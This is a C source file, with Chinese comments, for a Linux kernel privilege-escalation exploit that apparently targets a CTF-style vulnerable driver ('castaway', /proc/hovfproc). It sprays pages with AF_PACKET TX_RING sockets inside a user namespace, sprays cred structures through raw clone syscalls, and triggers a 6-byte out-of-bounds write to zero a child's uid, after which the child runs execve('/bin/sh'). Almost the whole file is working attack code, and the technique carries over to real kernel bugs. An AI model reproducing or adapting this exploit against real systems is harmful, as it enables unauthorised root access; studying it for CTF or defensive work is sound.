
// gcc -Os -static -masm=intel exploit.c -lutil -o exploit
// home/heap/heap_spray/pgv/exploit

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>

#define PGV_PAGE_NUM 1000
#define PGV_CRED_START (PGV_PAGE_NUM / 2)
#define CRED_SPRAY_NUM 514

#define PACKET_VERSION 10
#define PACKET_TX_RING 13

#define VUL_OBJ_NUM 400
#define VUL_OBJ_SIZE 512
#define VUL_OBJ_PER_SLUB 8
#define VUL_OBJ_SLUB_NUM (VUL_OBJ_NUM / VUL_OBJ_PER_SLUB)

#define CLONE_FLAGS CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

typedef struct
{
    size_t idx;
    size_t size;
    char* buf;    
}user_req_t;

struct page_request {
    int idx;
    int cmd;
};

enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

struct timespec timer = {
    .tv_sec = 114514,
    .tv_nsec = 0,
};

int proc_fd;
// 主进程用 cmd_pipe_req[1], cmd_pipe_reply[0], check_root_pipe[1]
// 喷射进程用 cmd_pipe_req[0], cmd_pipe_reply[1]
// 子进程用 check_root_pipe[0]
int   cmd_pipe_req[2], cmd_pipe_reply[2], check_root_pipe[2];
char  bin_sh_str[] = "/bin/sh";
char* shell_args[] = { bin_sh_str, NULL };
char  child_pipe_buf[1];
char  root_str[] = "\033[32m\033[1m[+] Successful to get the root.\n"
                  "\033[34m[*] Execve root shell now...\033[0m\n";

void note_info(char *msg)
{
    printf("\033[34m\033[1m[*] %s\033[0m\n", msg);
}

void good_info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\033[0m\n", msg);
}

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[-] %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

void alloc(size_t idx)
{
    user_req_t req = {
        .idx = idx,
    };
    ioctl(proc_fd, 0x112233, &req);
}

void edit(size_t idx, char* buf, size_t size)
{
    user_req_t req = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(proc_fd, 0x223344, &req);
}

// 子进程检查 uid 是否为0, succeed: execve("/bin/sh", args, NULL); fail: sleep()
int waiting_for_root_fn(void *args)
{
    /* we're using the same stack for them, so we need to avoid cracking it.. */
    __asm__ volatile (
        "   lea rax, [check_root_pipe]; "
        "   xor rdi, rdi; "
        "   mov edi, dword ptr [rax]; "
        "   mov rsi, child_pipe_buf; "
        "   mov rdx, 1;   "         // 从子进程的检查管道读取1字节到 child_pipe_buf
        "   xor rax, rax; "         // read(check_root_pipe[0], child_pipe_buf, 1)
        "   syscall;      "

        "   mov rax, 102; "         // getuid()
        "   syscall; "

        "   cmp rax, 0; "           // 判断 uid 是否为 0
        "   jne failed; "
        "   mov rdi, 1; "
        "   lea rsi, [root_str]; "
        "   mov rdx, 80; "
        "   mov rax, 1;  "          // write(1, root_str, 80)
        "   syscall; "

        "   lea rdi, [bin_sh_str];  "
        "   lea rsi, [shell_args];  "
        "   xor rdx, rdx;   "
        "   mov rax, 59;    "
        "   syscall;        "       // execve("/bin/sh", args, NULL)

        "failed: "
        "   lea rdi, [timer]; "
        "   xor rsi, rsi; "
        "   mov rax, 35; "          // nanosleep()
        "   syscall; "
    );

    return 0;
}

// 创建隔离命名空间
void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

// 创建 socket 并且分配内存页
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("\033[31m\033[1m[-] Failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET).\033[0m\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("\033[31m\033[1m[-] Failed at setsockopt(PACKET_VERSION).\033[0m\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("\033[31m\033[1m[-] Failed at setsockopt(PACKET_TX_RING).\033[0m\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

// 创建子进程
__attribute__((naked)) long simple_clone(int flags, int (*fn)(void *))
{
    // for syscall, it's clone(flags, stack, ...)
    __asm__ volatile (
        "  mov r15, rsi; "      // save the rsi == r15
        "  xor rsi, rsi; "      // set esp and useless args to NULL
        "  xor rdx, rdx; "
        "  xor r10, r10; "
        "  xor r8, r8;   "
        "  xor r9, r9;   "
        "  mov rax, 56;  "   
        "  syscall;      "      // __NR_clone

        "  cmp rax, 0;   "
        "  je child_fn;  "
        "  ret;          "      // 创建失败，返回主进程
        "child_fn:       "
        "  jmp r15;      "      // 创建成功，跳转执行子进程 waiting_for_root_fn 函数
    );
}

// 主进程的分配页面接口函数, 通过管道发送接收数据
int alloc_page(int idx)
{
    struct page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
    };
    int ret;
    // 向主进程的请求管道写入 idx 和命令
    write(cmd_pipe_req[1], &req, sizeof(struct page_request));
    // 向主进程的返回值管道读取返回值
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

// 主进程的释放页面接口函数, 通过管道发送接收数据
int free_page(int idx)
{
    struct page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    // 向主进程的请求管道写入 idx 和命令
    write(cmd_pipe_req[1], &req, sizeof(req));
    // 向主进程的返回值管道读取返回值
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

// 喷射进程命令处理接口
void spray_cmd_handler(void)
{
    struct page_request req;
    int socket_fd[PGV_PAGE_NUM];    // 1000
    int ret;

    // 创建隔离命名空间
    unshare_setup();

    // 处理来自主进程管道的程序请求
    do {
        // 页喷射进程的请求管道读取 idx 和命令
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            // 创建 socket 并分配页面
            ret = create_socket_and_alloc_pages(0x1000, 1);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            // 关闭 socket 并释放对应页面
            ret = close(socket_fd[req.idx]);
        } else {
            printf("\033[31m\033[1m[-] Invalid request: %d\033[0m\n", req.cmd);
        }

        // 页喷射进程的返回值管道写入返回值
        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

int main(int aragc, char **argv, char **envp)
{
    cpu_set_t cpu_set;
    char buf[0x250];
    // 设置 CPU 亲和性，只在当前 CPU 运行
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    // 打开驱动
    proc_fd = open("/proc/hovfproc", O_RDONLY);
    if (proc_fd < 0) {
        err_exit("Driver can't be opened!");
    }

    // 提权的进程不应当和页喷射的进程在同一命名空间内，页喷射的进程需要开辟新的命名空间,
    // 应当在原本的命名空间完成提权, 新开一个进程进行页喷射, 并使用管道在主进程与喷射进程间通信
    pipe(cmd_pipe_req);     // 请求管道
    pipe(cmd_pipe_reply);   // 返回值管道
    note_info("Setting up spray manager in separate namespace...");
    // 使用一个新进程来页喷射, 开辟命名空间
    if (!fork()) {
        spray_cmd_handler();
        exit(EXIT_SUCCESS);
    }

    // 向管道发消息, 让喷射进程分配大量的单张内存页, 耗尽 buddy 中的 low-order pages, 分配1000次
    note_info("Spraying pgv pages...");
    for (int i = 0; i < PGV_PAGE_NUM; i++) {
        if(alloc_page(i) < 0) {
            printf("\033[31m\033[1m[-] Failed at no. %d socket.\033[0m\n", i);
            err_exit("FAILED to spray pages via socket!");
        }
    }

    // 向管道发消息, 释放页面给子进程的 cred 作下一步分配, 1,3,5,7,9...999
    // 间隔一张内存页释放掉部分单张内存页
    note_info("Freeing for cred pages...");
    for (int i = 1; i < PGV_PAGE_NUM; i += 2){
        free_page(i);
    }

    note_info("Spraying cred...");
    pipe(check_root_pipe);
    // 堆喷 cred, 这样便有几率获取到释放的单张内存页, 创建 514 个子进程, 使用单数内存页
    for (int i = 0; i < CRED_SPRAY_NUM; i++) 
    {
        if (simple_clone(CLONE_FLAGS, waiting_for_root_fn) < 0)
        {
            printf("\033[31m\033[1m[-] Failed at cloning %d child.\033[0m\n", i);
            err_exit("FAILED to clone()!");
        }
    }

    // 释放页面给 vulerable objects, 0,2,4,6,8,...998
    // 释放掉之前的间隔内存页
    note_info("Freeing for vulnerable pages...");
    for (int i = 0; i < PGV_PAGE_NUM; i += 2){
        free_page(i);
    }

    // 堆喷 vulnerable objects, 使用偶数内存页, 希望可以获得一个 oob-write 给 cred
    // 这样便有几率获取到释放的间隔内存页
    note_info("Trigerring vulnerability in castaway kernel module...");
    memset(buf, '\0', 0x250);
    *(uint32_t*) &buf[0x200 - 6] = 1;    // cred->usage = 1
    // 调用函数分配 400 个chunk
    for (int i = 0; i < VUL_OBJ_NUM; i++) 
    {
        alloc(i);
        // 有可能溢出6字节覆盖到子进程 cred 的 uid
        edit(i, buf, 0x200);
    }

    // 检查子进程中的权限
    note_info("Notifying child processes and waiting...");
    // buf 514字节的数据写入主进程的检查管道, 除非子进程从管道读取完数据或者成功执行 execve, 否则主进程一直睡眠
    write(check_root_pipe[1], buf, CRED_SPRAY_NUM);
    sleep(114514);

    return 0;
}